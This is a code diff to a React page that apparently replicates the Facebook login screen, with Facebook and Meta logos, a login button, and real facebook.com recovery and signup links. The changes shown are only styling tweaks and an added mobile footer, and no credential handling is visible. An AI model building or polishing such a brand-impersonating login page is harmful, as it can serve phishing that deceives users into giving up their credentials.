@@ -55,8 +55,8 @@ function App() {
 }
 
 const FacebookLogo = () => (
-  <svg viewBox="0 0 36 36" className="w-12 h-12" fill="hsl(var(--fb-blue))">
-    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34v-9H9v-5h5v-3.5C14 12.252 16.763 9 21.5 9c1.754 0 3.5.5 3.5.5v4h-2c-1.93 0-3 1.07-3 3v3h5l-1 5h-4v11.27z" />
+  <svg viewBox="0 0 24 24" className="w-12 h-12" fill="hsl(var(--fb-blue))">
+    <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
   </svg>
 );
 
@@ -64,7 +64,7 @@ const MetaLogo = () => (
   <img 
     src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp"
     alt="Meta"
-    className="h-4 w-auto"
+    className="h-3 w-auto"
   />
 );
 
@@ -300,8 +300,8 @@ const Index = () => {
               />
               <button
                 onClick={handleLogin}
-                className="w-full h-[52px] bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#166fe5] 
-                          text-white text-[17px] font-semibold rounded-[10px] mt-2 
+                className="w-full h-[42px] bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#166fe5] 
+                          text-white text-[17px] font-semibold rounded-[37px] mt-2 
                           transition-all duration-200 shadow-sm"
               >
                 {t("loginBtn")}
@@ -312,7 +312,7 @@ const Index = () => {
                   href="https://www.facebook.com/login/identify/"
                 className="inline-block px-24 py-3  text-[#0b0b0b] text-[15px] font-medium underline
                           rounded-full transition-all duration-200
-                          hover:bg-[#f0f2f5] hover:text-[#0c0c0c]"
+                          hover:bg-[#f0f2f5] hover:text-[#0c0c0c] hover:w-full"
                 >
                   {t("forgotPassword")}
                 </a>
@@ -327,14 +327,14 @@ const Index = () => {
               <button
                 onClick={() => window.location.href = "https://www.facebook.com/reg/"}
                 className="w-full h-[52px] border border-[#1877f2] text-[#1877f2] 
-                          text-[17px] font-semibold rounded-[10px] hover:bg-[#f0f2f5] 
+                          text-[17px] font-semibold rounded-[37px] hover:bg-[#f0f2f5] 
                           transition-all duration-200"
               >
                 {t("createAccount")}
               </button>
             </div>
 
-            <div className="flex justify-center mt-12 lg:mt-16">
+            <div className="flex justify-center mt-12 lg:mt-4 ">
               <MetaLogo />
             </div>
           </div>
@@ -402,8 +402,20 @@ const Index = () => {
           <p className="text-xs text-muted-foreground text-center mt-3">Meta © 2026</p>
         </div>
       </footer>
+      {/* Mobile Footer */}
+        <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200 bg-white">
+          <div className="flex justify-center gap-x-4">
+            <a href="#" className="hover:underline">About</a>
+            <a href="#" className="hover:underline">Help</a>
+            <a href="#" className="hover:underline">More</a>
+          </div>
+          <div className="mt-2">
+            <span>Meta © 2026</span>
+          </div>
+        </footer>
     </div>
   );
 };
 
 export default Index;
+  
